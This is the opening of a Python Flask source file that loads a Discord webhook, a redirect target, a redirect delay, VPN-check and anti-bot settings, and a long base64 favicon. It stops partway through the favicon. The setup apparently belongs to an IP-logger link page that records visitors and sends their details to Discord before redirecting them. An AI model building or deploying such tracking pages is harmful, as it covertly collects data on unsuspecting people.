import logging
import os
import random
import sqlite3
from functools import wraps

import httpagentparser
import requests
from dotenv import load_dotenv
from flask import Flask, request, render_template_string, g, session, redirect, url_for

# Загрузка переменных окружения из файла .env
load_dotenv()

# Использование переменных окружения
DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")
REAL_URL = os.getenv("REAL_URL")
REDIRECT_DELAY = int(os.getenv("REDIRECT_DELAY"))
LOGGING_LEVEL = os.getenv("LOGGING_LEVEL")
VPN_CHECK = int(os.getenv("VPN_CHECK"))
ANTI_BOT = int(os.getenv("ANTI_BOT"))
FAVICON_BASE64 = "data:image/x-icon;base64,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Zv8ARWb/AEVm/zKeyv9NzP//Tcz//03M//9NzP//Tcz//03M//9Nzf/qTMz/MgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABMz/8lTc3/6k3M//9NzP//Tcz//03M//9NzP//Tcz//0vJ+/8IU3b/AEVm/wBFZv8ARWb/AEVm/wBFZv8ARWb/CFN2/0vJ+/9NzP//Tcz//03M//9NzP//Tcz//03M//9Nzf/qTM//JQAAAAAAAAAAAAAAAAAAAAAAAAAATcz/Ck3M/9RNzP//Tcz//03M//9NzP//Tcz//03M//9NzP//OanX/wBFZv8ARWb/AEVm/wBFZv8ARWb/AEVm/wBFZv8ARWb/OanX/03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9Ny//UTcz/CgAAAAAAAAAAAAAAAAAAAABNy/+OTcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//8sk7//AEVm/wBFZv8ARWb/AEVm/wBFZv8ARWb/AEVm/wBFZv8sk7//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9MzP+NAAAAAAAAAAAAAAAATsv/J0zM//pNzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//yyTv/8ARWb/nbXA//n39P/59/T/+ff0//n39P+dtcD/AEVm/yyTv/9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//0zM//pKyf8mAAAAAAAAAABMzf+eTcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//OanX/wBFZv9ljqD/+vj1//r49f/6+PX/+vj1/2WOoP8ARWb/OanX/03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//0zL/54AAAAAVcz/D03M//ZNzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9Lyfv/CFN2/wlMa//Q2t3/+vj1//r49f/Q2t3/CUxr/whTdv9Lyfv/Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz/9lXM/w9MzP9aTcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//8ynsr/AEVm/xFRcP92man/dpmp/xFRcP8ARWb/Mp7K/03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//TMz/Wk3M/5xNzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//8vl8P/BExu/wBFZv8ARWb/BExu/y+Xw/9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP+cTMz/zE3M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9IxPb/NqXT/zal0/9IxPb/Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//0zM/8xNzP/sTcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz/7E3M//xNzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP/8Tcz//E3M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//J4mz/wNKa/8UaI3/SMT1/03M//9NzP//Tcz//03M//9NzP//Tcz//0jE9f8UaI3/A0pr/yeJs/9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//xNzP/sTcz//03M//9NzP//Tcz//03M//9NzP//Tcz//zyu3f8ARWb/AEVm/wBFZv8igar/Tcz//03M//9NzP//Tcz//03M//9NzP//IoGq/wBFZv8ARWb/AEVm/zyu3f9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz/7EzM/8xNzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Joiy/wBFZv8ARWb/AEVm/w1bf/9NzP//Tcz//03M//9NzP//Tcz//03M//8NW3//AEVm/wBFZv8ARWb/Joiy/03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9MzP/MTcz/nE3M//9NzP//Tcz//03M//9NzP//Tcz//03M//8khK7/AEVm/wBFZv8ARWb/C1d7/03M//9NzP//Tcz//03M//9NzP//Tcz//wtXe/8ARWb/AEVm/wBFZv8khK7/Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M/5xMzP9aTcz//03M//9NzP//Tcz//03M//9NzP//Tcz//zWi0P8ARWb/AEVm/wBFZv8bdZz/Tcz//03M//9NzP//Tcz//03M//9NzP//G3Wc/wBFZv8ARWb/AEVm/zWi0P9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//TMz/WlXM/w9NzP/2Tcz//03M//9NzP//Tcz//03M//9NzP//TMv9/xZsk/8ARWb/B1F0/0K46f9NzP//Tcz//03M//9NzP//Tcz//03M//9CuOn/B1F0/wBFZv8WbJP/TMv9/03M//9NzP//Tcz//03M//9NzP//Tcz//03M//ZVzP8PAAAAAEzL/55NzP//Tcz//zio1v8WbJP/Rr/w/03M//9NzP//TMv+/z6z4v9JxPb/Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9JxPb/PrPi/0zL/v9NzP//Tcz//0a/8P8WbJP/OKjW/03M//9NzP//TMv/ngAAAAAAAAAASsn/JkzM//pNzP//LZTA/wBFZv8QYYb/SMP1/03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9Iw/X/EGKG/wBFZv8tlMD/Tcz//0zM//pKyf8mAAAAAAAAAAAAAAAATMv/jU3M//9My/7/G3Wc/wBFZv8MWn7/PK/e/03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//PK/e/wxafv8ARWb/G3ad/0zL/v9NzP//TMz/jQAAAAAAAAAAAAAAAAAAAABNzP8KTcv/1E3M//9Myv3/IX+o/wBFZv8ARmf/FWuR/y6Wwv88rt3/TMv+/03M//9NzP//Tcz//03M//9NzP//Tcz//0zL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//9NzP//Tcz//03M//9NzP//SMT1/wZPcv8ARWb/AEVm/wBFZv8ARWb/AEVm/wBFZv8ARWb/AEVm/wBFZv8ARWb/Bk9y/0jE9f9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz/9E7N/2UAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD//wFMy/9ATcv/6E3M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//MZvI/wBFZv8ARWb/AEVm/wBFZv8ARWb/AEVm/wBFZv8ARWb/AEVm/wBFZv8ARWb/AEVm/zGbyP9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03L/+hMy/9AAP//AQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEnO/xVMzP+5Tcz//k3M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//H3uj/wBFZv8ARWb/AEVm/wBFZv8ARWb/AEVm/wBFZv8ARWb/AEVm/wBFZv8ARWb/AEVm/x97o/9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//5MzP+4Sc7/FQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEzN/3VOzP/6Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//FWuR/wBFZv8ARWb/AEVm/wBFZv8ARWb/AEVm/wBFZv8ARWb/AEVm/wBFZv8ARWb/AEVm/xVrkf9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9OzP/6Tcz/dAAAAAAAAAAAAAAAAAAAAAAAAAAAUM//IE3M//NNzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//FWuR/wBFZv8lX3v/3OLj//n39P/59/T/+ff0//n39P/59/T/+ff0/9zi4/8lX3v/AEVm/xVrkf9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz/8krO/x8AAAAAAAAAAAAAAAAzzP8FTc3/nk3M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//H3uj/wBFZv8PUG7/0Nrd//r49f/6+PX/+vj1//r49f/6+PX/+vj1/9Da3f8PUG7/AEVm/x97o/9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//0zL/55A//8EAAAAAAAAAABLzf8zTsz/403M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//MZvI/wBFZv8BRmb/kKy4//r49f/6+PX/+vj1//r49f/6+PX/+vj1/5CsuP8BRmb/AEVm/zGbyP9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//0zM/+NLyP8zAAAAAID//wJOzf92TMz/+k3M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//SMT1/wZPcv8ARWb/Glh1/97k5f/6+PX/+vj1//r49f/6+PX/3uTl/xpYdf8ARWb/Bk9y/0jE9f9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//0zM//pOzf92gP//AkvS/xFNzf+yTcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//ymNuP8BR2j/AEVm/0F0i//Az9T/9vXy//b18v/Az9T/QXSL/wBFZv8BR2j/KY24/03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9Nzf+yS9L/EUnM/yNOzP/mTcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//0bA8v8WbJP/AEVm/wJGZ/8XVXP/NmuF/zZrhf8XVXP/AkZn/wBFZv8WbJP/RsDy/03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9OzP/mScz/I07M/0tNzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9Btub/E2WL/wJJav8ARWb/AEVm/wBFZv8ARWb/Aklq/xNli/9Btub/Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tsz/S0zM/4ZNzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//RsDx/yuRvP8Yb5b/Dl+D/w5fg/8Yb5b/K5G8/0bA8f9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//TMz/hk3L/7ZNzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//0zL/v9IxPb/Rb7v/0W+7/9IxPb/TMv+/03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcv/tkzM/9pNzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//TMz/2kzM//BNzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//TMz/8E7M//1NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tsz//U7M//1NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9Jxfj/Ko+5/wdRdP8IU3b/LJK9/0rH+v9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Ssf6/yySvf8IU3b/B1F0/yqPuf9Jxfj/Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tsz//UzM//BNzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//0vJ/P8rkLv/A0ps/wBFZv8ARWb/AUdo/ymOuP9My/7/Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9My/7/KY64/wFHaP8ARWb/AEVm/wNKbP8rkLv/S8n8/03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//TMz/8EzM/9pNzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//0W/8P8QYYb/AEVm/wBFZv8ARWb/AEVm/wtYfP9Cuer/Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9Cuer/C1h8/wBFZv8ARWb/AEVm/wBFZv8QYYb/Rb/w/03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//TMz/2k3L/7ZNzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//z+15P8CSWv/AEVm/wBFZv8ARWb/AEVm/wVOcP81os//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//81os//BU5w/wBFZv8ARWb/AEVm/wBFZv8CSWv/P7Xk/03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcv/tkzM/4ZNzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//zqr2v8ARWb/AEVm/wBFZv8ARWb/AEVm/wNKbP8wmcX/Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//8wmcX/A0ps/wBFZv8ARWb/AEVm/wBFZv8ARWb/Oqva/03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//TMz/hk7M/0tNzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//z2w3/8BRmj/AEVm/wBFZv8ARWb/AEVm/wRMbv8yncr/Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//8yncr/BExu/wBFZv8ARWb/AEVm/wBFZv8BRmj/PbDf/03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tsz/S0nM/yNOzP/mTcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//0O77P8KV3r/AEVm/wBFZv8ARWb/AEVm/whTdv89sOD/Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//89sOD/CFN2/wBFZv8ARWb/AEVm/wBFZv8KV3r/Q7vs/03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9OzP/mScz/I0vS/xFNzf+yTcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//0rH+f8gfqb/AUdo/wBFZv8ARWb/AEVm/xt0nP9KyPr/Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9KyPr/G3Sc/wBFZv8ARWb/AEVm/wFHaP8gfqb/Ssf5/03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9Nzf+yS9L/EYD//wJOzf92TMz/+k3M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9Duuv/EmSK/wBFZv8ARWb/E2eM/0a/8P9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Rr/w/xNnjP8ARWb/AEVm/xJkiv9Duuv/Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//0zM//pOzf92gP//AgAAAABLyP8zTMz/403M//9NzP//Tcz//0nF9/8skr3/KY65/0nF9/9NzP//Tcz//03M//9NzP//S8n8/zem1P84qNb/S8f6/03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//0vH+v84qNb/N6bU/0vJ/P9NzP//Tcz//03M//9NzP//ScX3/ymOuP8skb3/ScX3/03M//9NzP//Tcz//0zM/+NLyP8zAAAAAAAAAABA//8ETM3/nU3M//9NzP//Tcz//z2x4P8CSWr/AEVm/yB9pv9Iw/X/Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP//Tcz//03M//9NzP/